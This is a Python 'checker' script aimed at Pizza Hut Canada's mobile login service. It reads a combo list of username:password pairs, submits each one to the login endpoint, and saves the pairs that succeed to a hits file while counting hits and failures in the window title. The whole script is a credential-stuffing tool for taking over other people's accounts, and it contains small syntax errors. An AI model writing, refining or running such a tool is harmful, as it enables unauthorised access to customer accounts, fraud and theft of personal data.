#import modules and set some things
import requests, time, json, os, ctypes
op1 = 1
op2 = 2
lines = 0
linenum = 0
hits = 0
dead = 0
username = ''
password = ''
ctypes.windll.kernel32.SetConsoleTitleW('Pizzahut CA Checker | Hits: ' + str(hits) + ' | Invalid: ' + str(dead))
print("Pizzahut CA Checker by Pured")
exists = os.path.isfile('combos.txt')
if exists:
    with open('combos.txt', 'r') as (f):
        for line in f:
            lines += 1

        print('Lines in combos: ', lines)
        f = open('combos.txt')
        readl = f.readlines()
        print('Pick an option:')
        print('[1] Start checking')
        print('[2] Exit')
        option = int(input('>: '))
        if option == op1:
            print('Starting...')
            while linenum < lines:
                combo = readl[linenum]
                data = combo.split(':')
                username = data[0].replace('\n', '')
                password = data[1].replace('\n', '')
                r = requests.post('https://www.pizzahut.ca/mobilem8-web-service/rest/mobilem8/loginViaPost', data='user=' + username + '&pw=' + password + '&t=1552861474847&tenant=ph-canada', headers={'Content-Type': 'application/x-www-form-urlencoded'})
                response = str(r.content)
                check = 'Successful.' in response
                if check == True:
                    print('[Hit]' + username + ':' + password)
                    file = open('hits.txt', 'a')
                    file.write(username + ':' + password)
                    file.write('\n')
                    file.close()
                    hits += 1
                    ctypes.windll.kernel32.SetConsoleTitleW('Pizzahut CA Checker | Hits: ' + str(hits) + ' | Invalid: ' + str(dead))
                else:
                    print('[Invalid]' + username + ':' + password)
                    dead += 1
                    ctypes.windll.kernel32.SetConsoleTitleW('Pizzahut CA Checker | Hits: ' + str(hits) + ' | Invalid: ' + str(dead))
                linenum += 1

            print('completed')
            time.sleep(10)
        else:
            if option == op2:
                print('exiting...')
                time.sleep(1)
            else:
                print('invalid option!')
        print('Done!')
        time.sleep()
else:
    print('combos.txt not found!)
    time.sleep(1)
